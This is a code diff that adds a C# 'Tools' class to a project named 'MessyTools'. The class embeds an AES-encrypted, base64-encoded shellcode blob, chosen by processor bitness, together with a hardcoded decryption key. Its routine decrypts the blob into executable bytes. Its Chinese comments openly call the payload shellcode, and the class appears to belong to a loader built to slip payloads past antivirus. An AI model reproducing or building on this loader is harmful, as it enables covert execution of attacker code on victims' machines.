@@ -237,4 +237,59 @@ namespace MessyTools
             MEM_WRITE = 0x80000000
         }
     }
+
+    class Tools
+    {
+        public static byte[] getSc()
+        {
+            string sc = "";
+
+            // 利用IntPtr结构的Size属性来查看系统的位宽；前提是程序需要采用Any CPU的方式进行编辑
+            if (IntPtr.Size == 8)
+            {
+                //x64
+                sc = "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";
+            }
+            else if (IntPtr.Size == 4)
+            {
+                //x86，暂时也放x64的shellcode，不然更改位数这里获取不到会报错
+                sc = "iucYItIWPXMxuyc2oSxeoK/qt+/+4RxFf6tA0ryKjXK+N4IYvdp5bfDi1iOTYH8hnT2bistFuyprw7CB835c6PzzWZcPaxsnNJhYp1MYBCshWeCZuCTO3RTmXbUbqCGpY0f2jqJA6MomK9V/h6REyd+EwFdgNWSekUEli9fib3Me2EekeQebo3RXNqXdWPY6g+pwGRLuA1N4bugc8c5tkbT5WZZwzFP+m8NieKpYzjNKZXU/fSwLNmljw31z2smeTPNJE87cRPvwofqM0nzjq0mrCArC6mzTp2iqNpXrVs8gCCrNNZMIqBteIvGdGFXJswbAlaK1W9xDOFLwwnoz7lqhw2bVT8nXTinljdy2L2+fhJ2tiiMpJ0u6SS/nOZEEy2w9y9dAuGlNHPDKifJZTwXrwGl9qJVFbAgFzGqcXLk6WPXIyzL1CbXiBJUeGKaC70VDVZbpihqbhEvJGkSsxgQSMyL6OhO9htRqG0lVMnNjHGuH/dV0Su6pGbU4vgj2HL8iVHhgb/7ikMYnuN3RUPyEJlKnagMqZ+PZZcqxoKefFOALBWDgolQeSUYhmkv7MIZbwQSmU7m2jXicwZbO2oJWjSr8V8sH1CcYTOwtipFTf0lybfCmEZol/avwG6zThP9+64E+TZWinWEiFGcvevUpbLswweBpDVDuaG3gbfak6Eu+wPJM23z22xJgupd3oPYJ2datciNJlBVSy/jArhM8EZ2o2y0RJslO1v7fA8Cs2ONZDw92MXepYpChLTJSG3Zklh+y8iPuw3zVxysMYS/nSG6BlXEeYSiqrFnVwVqrcAV6PggCSHr07M3oxs9ioV7LtLvHI09YoUaDMASbZ/nYXcfiN9hCqJnR0bqcmy2CcGfqB54EaBPxpz3YUiXeU77BzZeYc228BLeQZFa1Qp5yWfzXFWumpI38ZpM1+kehN794fJzqqwVLNhAKfmI2T0Iwmngs7HQxyWElyFO9VPUpbLswweBpDVDuaG3gbfZtKy3jXLpHxqhdcAUgdiRvAIegJhNMzMJJN4Ty1bEA4s7mi29JSUvBAQDSM0MIwDfeB58yOJBXIAmgIOYDwI1UJ15i5VptVr4sJgtCbU6Q+boRVENPVD+iXc8Zots1SXF/5RCuL3Artnd+ERBJnIlVMdS6fRYEctxXMvijaSj8wyInTtxbVsrwkRAOggzus9emOaSqnv4/Nef3QHE2BkvPjczTHuzbWzWEltjw9KEmZzmR8643VVbA7t3wntb4LLw8Jp1tt1B1j2zQzrkJfvATe/Qy6LdtE48E1UnH8PFgHm4c9s9dKzYvxvF34qEPR1kGpp/8MWGVKNCJ+jUPmF53GxtiA436Ux/aBa5qMjEjLY76yl19AqU+RTE/ml8x+wv8hCZSp2oDKmfj2WXKsaCnkWDXlUwfGyoeFcG6urLZBzmZVWNmc3aS6WSMk2VfS8A/CMqF3tdLGGnOiAgG3dQuMOBtFT6eAuWW9JKKpNGhESoVDSDsJjGxbeaOL06+M5V3jftcwT5ZFkgoKqV7LKo4UUWgmQ9aCzir0Y24qa7PcB2Z7igvYKTQNDMk4BHQVCW5bzxX6ULPUv6OFHIZJcfcWDm1uZPDUVF8Gtc3nt1RhtTRx33e2/oDShG45rAExtD9N896NBYsqshroF3jPW2tKueueI/VplMdNaq9xzUYGbsxDA6zAoagLlz22VvPZ9l63Cd6MB2RY+kSc1osOZG7CEP82NTs+Pq3kSMsXZUFz29XL4t0cobsFlV9BnxoHIsIwsqYvEYVbQfP9+T2yEOYH3IUVkCgbGM8wpFRX0Ycp3SmfwlrU7bQBcHQSklMWEY7Hibxqo4jHieIYimyHqzHBQqfW+Z62xCXfA06VHlbJg0s2hpmzWj+x7A4cdix84yh3b85+KNoUl+FNirQmJQBXwFB9fBtPQkDdAxbBa1VGRBQpwfTuRSDE2wIN1gAdFS5+znBT2kcNymI/WJ/thoiSUJc6GSHtkNFS8ONrezF2Q==";
+            }
+
+            // 解密并转换为byte[]
+            List<byte> b = new List<byte>();
+            foreach (var i in AesDecryptor_Base64(sc).Split(','))
+            {
+                b.Add((byte)int.Parse(i.Substring(2), System.Globalization.NumberStyles.HexNumber));
+            }
+            byte[] RLSXlbz = b.ToArray();
+
+            return RLSXlbz;
+        }
+
+        /// <summary>
+        /// AES解密.
+        /// </summary>
+        /// <param name="str">传入要解密的字符串.</param>
+        /// <param name="key">支持的密钥长度为128/192/256位,默认长度256位; 默认秘钥为openopenopenopen,长度为128</param>
+        /// <returns>返回解密后的字符串.</returns>
+        public static string AesDecryptor_Base64(string str, string key = "openopenopenopen")
+        {
+            if (string.IsNullOrEmpty(str)) return null;
+
+            byte[] toEncryptArray = Convert.FromBase64String(str);
+
+            System.Security.Cryptography.RijndaelManaged rm = new System.Security.Cryptography.RijndaelManaged
+            {
+                Key = Encoding.UTF8.GetBytes(key),
+                Mode = System.Security.Cryptography.CipherMode.ECB,
+                Padding = System.Security.Cryptography.PaddingMode.PKCS7
+            };
+
+            System.Security.Cryptography.ICryptoTransform cTransform = rm.CreateDecryptor();
+            byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
+
+            return Encoding.UTF8.GetString(resultArray);
+        }
+    }
 }
